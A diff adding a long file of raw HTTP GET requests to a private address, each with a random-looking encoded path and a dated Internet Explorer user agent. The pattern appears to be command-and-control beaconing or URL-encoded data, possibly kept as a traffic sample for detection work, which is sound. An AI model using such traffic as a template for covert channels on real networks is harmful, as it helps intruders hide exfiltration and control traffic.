@@ -1,0 +1,700 @@
+GET /7tpmGxPuaDoCwBfUXDegOAYjHneqkH3nkDuoKhqtFT-5ByNKaW_sHqRW44xI-ietr9CP8ulvhCNMMIuv41iISmeE_L_tomuVZKTvU0_pJB5_onRYsy6wRNEZ7W9YiOPdzSn3MLCNN1pU5Vf2uq/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /vCRQ_dlLY0fWAMMUiPdyVwkxgm0m1DfJvx4dB-xY8IqpKEkE6xnC4AWQQZ7ixHhIb9wkC7kNPVNr4HCRSB-bBNiwCaowk4fM3r_qI8PT_P8gG4jz_Y/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /UPqKeGup5KEBNxQjX8CnDAcSBJT49T-GNmp-FvDrhVJ3X8gRPwcjUC82ORukl0X-45NQ-6wUvw5YeuB/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /HBho9hmOOEoUUQFFSqaybgXZsmuijnSUy4vOlrN-4eEq-XPRgVo0RI8MMcrmeAQHL-Yid_oCVnXjU8Al0ArWYkvB9uP6k4QseIOxtHv1mBxBgVN-lvzk32DJD0sfeCHkYZv0VwnbuqdSzh6TwB1gq14FESwIRRf9vBbaltcWI_9m2ktV20j/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /SGK-ua86gb0RTwRbT7i3CwqmPUElRI-GIl2oHHxDaWupeBqUfQtvTZDJpn8TMUPnbIlpQiNi2FdBbmAJH818GLR-PDp4ca3oBN2SaI/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /UrLZgmuGP55qh3-TNHDMzg5-m4ubkhtUyfUz7LVxmu9V-/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /TGeCPmZtGyWOEJsE0OcoXQljenFePN6KSQg7a6HmjytZNMaAcFQYMqNg6CY8VAj4OmFFLiNodm6LlVUxkXDuAV461Xrv2AKVnkpBzzNwt16LlBc_w0_prdvnaG9gVn2hge6jBcQpmnVv_w3sJpbPLZy7jdlD_hwIe8Fax7S-hu9jsTcloN_hRzem3iUidl7bHjxjIBsXtldO/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /i9a5XMzUNf6dt4ijw0A75QVappK0qk7lRCGcsKw70rBEZiaqqK6UcgxijON0ampyjUQXVsB__RuAItYY-GaeMGAvHBblwkovYmSe2osrD-Mr78YkCcRKKR08qrv68c3mmHsN7zpJQD1tc4KcKjy5YASIf2aaOnv9zRijDMaqVBZdhRM5sL6hfZJk7fcpNcWnOQBrc_lAvhJP6s4O8y5N/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /xCwza26f_ZikZLFw-pMCMg03a-FBjimJVH2bTgMzcQBP4Qw8BuwjNOZzcz3umq1k_4pW7lyxFvbc53hsZApOWSJMdDdOdLP1V-MJJkPmwUn0FUXxzhpGnTOmcgRL5NnL_nAwPFPRNuvGAfyXbx0KhE8X_yRe3hhaTb9TwifXlK5DsBG4ESmxMHnWUQj_Qzu5pQHBv1BTGmsagyooFat5HI0vsHRhlCfu09wez7CM-hTAuNgjJWVG4GKpldr/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /jlex4a3aLsyl9bDh-wIDrgxK-Hj08BLMrdA0C_3HvOTAkbw1BwKBSmBcjz8EgtCOhhET7oLI360vSPlxgKQI78YaXLSRHc0wDZtZu_0aH-WWjADrMULh3vvfpRvyBssfzB-MSeaQiJInHxzrYJrL16eSVcZXGP7n41lFWuVKYCBd0jtIU96NAymH6xcuRpOVi_ygqKaVuLqmyDdWe9fdQ602uBPYV658/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /m5lPS4hdpILrBf4RtfIu3A1deEyhFFzGS8DGunDSmMp5396WVdoYzVqstJMgOPDjwvaL7hlq8ax8SXvqC8kI29L9i8EZaTJyPzTP1nIV7EqxbOnx4w3cJYizGKvmuq9InuMo/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /4gviPViB62sX9QLhSQLSKAO0NZc18KTEBT4tT8QzSXreGB_eWKeOp-K_mByYHkkuvmj7gHtB1YWR8g8Tk6Re2bWf0otWhEvlRnrMUbcrqEfEWI3l4wNskErUou0js/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /qjZeiuxZo0ut8Ljk8wdoEginiywyr0t8RhjdWyeUSdPMD1CPS-_RIDZ6cEpWmSHM2qA9C1bfrGTpRsWJ6eNQLyNcJYwTSR5ISeNgsilBL5ptAvfkuv-XuGnLgNWuHkD5bgLDzuWYUitn9L4IM6pRdhoLRglMMCGO7ARytF2Ib1SLOlejBqryZ_XfSweCP4E1FWvsb/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /CizRsrqWJZnHhtKSmXECYQkt6WjE4gHBXRHUzGROJ3S9aZj_tJUebRr6qzFq1-6yv6P-3BDUSAyOMNfdWQ89QIIkgiE_fqZLU4tOHDep--a7b0XFh74G2fP98AV5cJHfepCbQokNxJTjWDLVeH5iU6NsH82cROHIefJNFzEkMhoD6VoTW-gXbAG8Yl4-duehBOyTj3O_SkWk145gqXx7aiYL_IbXQAXVB0fY7MyP6zyJ6d5fAu7pldkzCjkq/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /T8uWz2iIYUzMGtkOku0J8QZd-xuL7vEs4TEJtBGp0bevb/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /KtDMDur2KqePE5oH0eRK_AMzkr8vRMxB_zPMGnwv5nfSADQz4d9eB0nPYtcbxEA3qPJJdUaa-3v/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /G9GNeisj0Z8ZzwzbRzjcOwftY8ctgjhs5nlv2qzcChlqTY7upRjguc0GONujFOlRMd2eRCQDD8HxYy48aQOsUEO27056EHvGwcANNoxiaIGKhSAXZMckAdBepEZ5vGN3_iwbBkfA0oFa0BLAV-nLA7G6rW7_vUa4fuPUCQLEP9WlUOMgK6NFo8wKQ6CyE-c1ntdJ4gKrtbWepapenEPo1LMY4VjGwKAUWfuxZnji-NyJK-7kFBs9ux9UND/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /gxrARgXFbXhol32DNmCtbwj0Ky7b-ymLXa7wD9WV8f/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /YMPh2JrYzkSQMYUlzsZVzAktCJuTmXx/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /WChTZu9_ffoiGDcMfO_kGQvVo1Y581ab99gZBjyba9JM6IdO4A7AlKESU1Jga2OyUaJfxE55YYF6mJAsiGs4sj2lDJKF5p99EsrWc5IskKJV2CtYX5Jiu1tEfFAHgsPjX20oZGKkPr_1TZKfnbIxUbvHX6ufp9i5UYBIAByCSH8wRfMo9MaMIGWRqX89fXG4q7x3PX_rr5ZcsF_PQN0a5UMZ0r/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /TNdEtvRI0xjVM8Ani8o69AXg7fIIvfX9sf33JQI8PGkJefAnAYLfWltXnuwIln2Fq8EqTiY3p8dypCdo9ZgUDbCJdtXRuQTcKc3pDEeqqlzP96IKql_LBvGgYiFf7_AVUE4oPbaAgpdh4bTO2cf5FI7cFYQ3UYjEwy1rkcmVISVYOYXj3s-RnXg_/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /4ExiHckp3z9XtkKiCU-4egKP7tTRdnHyhIUREmWZqhB_UHVp2dpJ3Gx9Am0fn4nm78LwccpR9u5aiHPhdvX81ehDeKS_1U9B4aIZal0vBUEj813XsoeOn7/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /xWfJuWD-jeZhanR-P5OOuwiug0C5asum-_slw2yY-iM3zNGN5MlQFZDiqCVBuDHlIcIFUmzE4tKNmTUyw522PD6qY9QnApHYUnC_bBKCdM9g-mVO-WLXvZ9qe8xFODC/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /JJnyKQhl4sK9V6hD465SggtmcwQ0s-qLWe6GH7/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /0jDgGx1veOYvlTqBcWzATw2RIKHxuEVSA6gaJzfNrQRgKZ3fsklF7OMkMEl_4ib3qlTWybk5zzuGqnaSG3Q_pHLUO0r-FrqFg9jqthfKZgXxh730gWGyzzbo6ygr3Mcma8uvmMlazPp_CjrzER3rg7e5An3_XLfD-UeA2i0V2W8bNB-lPbiGL8zPXQHcLvCw3MyBqz7q-iQpMiJptFaF9qBMzesUimerXyQLT6tndS/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /dl7esAfOYNSsG7kP8uJDxQigFoEWF4-anHI7FEueEi60-NrVd-FSYfyNht4TkUnVDOpKB7YSOTQUh8YjyW2JY24jczt_2p9WqqTRfyfr4Mua3-z2VSI8dowefzcfuyzUMyVHQjJdTGoyEo5ELfrDzPw3-Rq9X-qaJ6fFao/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /lPNiV_XSeP_kZvFyup8LhQatFVmh9MqWQwBn_Boqy78EoJZcmQbc4zY39SsDuWVeczw3tyvjxrehDRFeAlCxjeAE6gUH49DdporwD951pvZFv6eVdsmPPOeDpcm6UpcOnlK_IKpVC-Nw8DsrVdfep-jys/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /nyW-3jNBdgxE2VHNGiCrMQ2RG5EWbuQNJe1uFkJgw3uYUlgCF2IJ0ZuxzQeGXakzAUtilnEH1QAYsd6_MdNV_sPeJCjTLOJevPB/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /d5nIvcmO8AWXYoJ2yZt4jgIW3exP6OhJb7P8arF4a36ALf60fvZtszPhe2WO3rKQXPGrl7Sfp/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /tARDqD-IYw2Be5Rv34JuigObzSmkPVWMONNcct2qA18DDuRNsKfpG3nb3VRgKgfMydfFIrh_b3oFQ_s1MCy2rgKyGtiKPtWrDX/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /azjTHbIQ3NFaV09DBK61oQXiF3tPWNBdtKXbfUmZgPyptm3yiFLAedWbtO9_XnF_78RLzjRIsw54Gl0swYiUyELYOePwq1D-LRJaIeTXa8hOXI6CBJ500z97bGkYN_hpDoiMf97Zi3_5L4-z/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /z07FaMeoTsuNjpia03didA4VCjn1FxX9Rn_sR_YL-Y2a7BjtdT7jVpwJhA4VP5Gkx62FHy5sc3NuGvLbKfiG2dcPVlJoqhQwhJXILSE_76AHmRXdOg5UZ-8euD0ToV0CeO6bT7EVbvoEOu9pYlDwY9OCEMkoTYIftT3XYqN6N22dom56-lAmpOHYzpf7WimRVUUVVj_LYdhl9n7A/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /Ng0vsexgFKnlNfAhu8wKygB_Ioy_vL5gQodgIo7tr1Gpn7yobkiKzIfeqyM3Tf6DHG4qFtEgOS821G6pDs5u9aXQ2LysGz5PBt0W-Lz9SUMOboabBvVEWz_g7Derg6lRzcY9Vv9pd1EG1__6sxsEwHnvp5qnRcx8Wa1h0KvedhIaNkThR6HRo9wsNRI-jBF7EZkM/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /0O3z63BWRc-e4Iv0wBlu5AjaelOSY9m5e--xjB3LuLaWfEkQz4k6qM2RZFfZVfi8Km_sbKlyoI54Zqrw7yZ8-F7AyZw8MEEnn6A2M1IPZqeRbNScQ1RRSeRk1ZaIeQmarjyn4hHPo/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /mzwOo-QXtMOLU55H1ap7Wwyc-Wo1q4nxgO0sNZ8c_wLqLj_ifI0Fcy1Z99oBXCXRvbf2g-YuEDflRVenglJcOzODz7Ac2swQZ0HQ4X1PiE5zrrkJkN7JtZaRjOkObtmuyqs2iIhjfJOi1XWEl0rxWrAdVB73o-p-R3lXG_q79TqagY/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /o_RdmYTw12R9-mjuIwON9wovPl-oExCcO2kB1sG2BHDP978p-RPzkVOtgN2NfrM2-i4Ro9QJ3gEwg-m8U_-WimGUSuGdcjO-jVqzhkhg8OgNGv-GKSUMCUJoKsJEv8DLSGrMfdze-I7A308RDuy46WZPMk/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /O5SEtgtBASLxAOQUr_kBEge2YR7k5ya4M6PsU72SG2q74GgjdoJZrPZLI7xmbLOH4RDJTL2ARbBJbrwb4Rd4VJ21rAe0Fixjb1xdaI_FEKVw3WQmDrKlVRItrokNZ8g3sSqo2xZanJxFl8Ymhz0KOVf98n0gJXgh1ksRICHV6hysmBZSS12RkHBjwttiOWZ70bZ1AG4U19rU3yaPsurEtv09penJnDGwsyNErOUay8Wd21EhxCJoU56VRMYTy/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /LjMUmmElmPyERZFR2rx0UwliOk3eh3iRg12EkMXbS6iYIjLmT2isFuo0XkA-kGUKsz2KEhFt7HgWkwztdsq1V4G2W/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /Zw5uso0nxme9-6jv4wJN4AWXmgHXEfFmq8hzSlwLjNGe2VUYHlATOOO1z1K4mXLTh1AA8x2gyWipTBYyk2MXv7wVqzftTdwLkqAhOzm580N0ORDL1sg513TPTZBud_ng61WW1SMEi6kbsimkiCeLzza3uew6-AXZOUPOFglg1yR738ahDatzvV30PIzQSNUe5UG20bRkmUtCkTqEDA4XOTPE/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /SxV2IUvYQGp8aGl8IpGMSAS7F7-ZTtjlVz8cg-r_ebSRO7mjW45Ro38QdZdqRZo430auNVr2eIvjXQAS546zor6rYAFA7Cyt6-u/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /HNIklBjj9NIREwQHT-rhNwjZ7tQKwBflXdMM4FkGL_Jm3YUhvhYtXH8oo8PWosNIUXGTuTWsXdXgriyjQ8FhrWBTOCdp4ciO-SJd_On9ztzF5s2pEGGFCgTkXCpYKoPHEfa4iEYweKkJKJrq2UVsiZfT-O4bGSmp7ycVOhKks6ycCCWY3zc4egNdTlLfakYX9nKNURgyt/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /Ah5ngMirfyy6E68H5OpKOgCF3ljMjtW1pR8fJ4-SC4KmBtkqZb9S4AsdpQZojjeK/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /WJOhprVft7cmVTNBeKzWewKl5W861AJmXWRSVYu8UWt1CxI9XgOTIXoCQLAPygy3q7AMndLfU4PW6TAQqHYlRwi9yHCrKZunYSwnWAJ0Ur0fPb6Ry4rGUyIwOERLQjMI2WNBL_8I_AM/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /zOkRKMIeyFgmZjNyeJ_WVA1MFM_efX3Qmpxq2hvOuSRZX98CR9gRG5qHylm2PEd8OB1XI96I3k1FgAwSx89_c5AF8UqwBmEmBc5ryJoxl86H_hjBwTLzgmg7WwiAiM_j1Bx-bwxrwq8uFu/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /qU_XbINjyVYwsSWlbkjAhgsLPAzm3aCQvt5yaO_KADKBKCMvVDXfoBFNYo8-1G22fdPIPuvWodWTAPlGjfdH2nHDij4iHR8QQYH_vgu4VHgVzoJ3YqguX7fRDHhAOcA40Fk2vk25Cr9HUMzonY1w-iNt/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /OExeqihiJ6gQ8AXkTgngzA994oWN3vJN9peq7J3kXvSPBR3-mwF9R8hZ6-wsFpS7cLe0nXmamw4hX_8GoWqzvhzGJ3PnwJsmukn4oN0Xx0H1TAlYwUxThIEuiDLCwWKkRssS/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /glbmGXQ_wo9jVHZAPa2TFA-1b1s5kamPLoTkALbb3nX0Mz4U-OvuNrFJ2i4OAJeihAstxCGv8l8QVPm8hWNjEk2aVazbxjM41yi7QM9guhPy2P1HFuXrTjGbtk63VV9MCdCkFeYyxEHT4QuLAashyEezUtoGwNddkcOJss85Pvj4ARObZrVV8vNY_QxjMenxdzF-xtEHbpa0nOFJ55FT-/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /vXInsBYF378EaRF9WpD0LAesgYpnORE8Y_7n3j8vezAVv47bMKM70saDRyuicO8EIxxyyTWH6onnzjNeP5eYQ0tS9R2yBp7A0kT2a10TfxUFXNfiZYcauduy4F6kOxnZvcYaSmMiOW4kRPSym68b8Z_ANErQ2LniedYqKUJHYvU6DbUMLNnRhBg3k/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /xkphsIm9HsJ_PmoqIcePdA2buiWmPBIqDJgNToU7Qo-sNxkaXiGZWHggU1iF1IED6n00bqWgXv2MaehRIBfby/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /bcG4cRrUNvyRAIQUz_lhTgjWd9s9blJnYgC_xBFYAT0BY3Y97OcYqjXEZkvRbGugWGdsn4PQ0p23rUKHrqI63LBTNWq05J0O4Q25FyPYWwe7XL7ZJ_SlxmWmTYjKS1voPArE5FOwJc6OE2oIvYJwV_UsxmVNJIuITVvMQCc2TTH5cHh/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /YZfl4HrUSG9rV35DNa6bBALOAwA2F3BQwOV_inr-mOUvyvpuOSgsJNCRPNlgCXRa/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /e4iX76SOZkTTvsaqjUcj6QykjLkP_YH8lwQ9hTvnk9PyOvaDgAwDanVc46LpK5Pa1ure50-t3_DUrhcUnzNuj74og8vKoRgErIJVkF/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /3SMjAeEGekA_Kio-YdPPdgYxftcFh4CJ-9QVKYL64eWXVvgYYzBv_zvLkqVTLdztPJFbKF7QgAOkDrbG_A6GQQzYRtp7GxRH6Z_UuUvgoTKJptexUv5fj8fAA65E8zsxN7/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /m_6gfEKvtkb6o--3pFoKwg8gF8WCvu08HE2/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /Lol2smlLMBW_nKqI4WVP-Qv5QG1FS9ulpkapqUnoBnHdzXLg5ABSEFh2Z8oA5Bsf79yDz5AZG4WWGIUL68-OLlAZWAqThftZE16RL-XGL1-9Ipjbi/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /ZqOedn4IzC1DFVYBHeyzfw9o-fOqj2JPjTOfgoQFx9v8f9vJHP67EtPXd4zBEJi2duSH8fr9ZGihTKjFGYzqeDPVmjeEua-dWa/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /YDMBIAlb33fiUPdEvKkSPgkkShUjPWE-UH2pQLG4pnBZwIFqCyoRCnuTzUQjImFsnYPOpnIKPPZsY6YluW5EKDms4GT1hoXVpXFdJz5yHmPZbCOdh6VZ5T8IbhhQG67IT3zzSMCy1qCm2PQLRKmak331UANr6BkyyrocnLbvyArCSwMwTCQbPi6o8OzslTbwDpdr0GCc7zllDuT1cMvXgdsn2wJ7om5/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /WRS9coxOWdqQh4WTzn5g9A1KVhGqhT1BM0jSCo_URrKpnLo9i5nMg9rKzg0QysHl6N5JXppQMfNHQ87X0oaKq-D9zxRt8YLZb9VQ0Ms5bEImAz4rFL7fLOz_QeFZYfmn18lbrKD8NZL8UHo_ZDjBFzBgbif2FQCRe98ahS-Me184PcGs5PvS_HlLP8bDiBZw/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /uB4dBjSGd8_KT99blLY6Nwh-r-LbRCLrg6gCMv9K6ZdgVJi4Pm8/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /sUXUeYJTfNDVpsCyi18l2gte777NP_vO5FEQ0cfm8Voe5ZbgBeXQLL0qR-M0W9uPdLe8GFJjrjBzcjDMiQ0N-mJCR-lYpLlLyedF_fWCsq62WZ/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
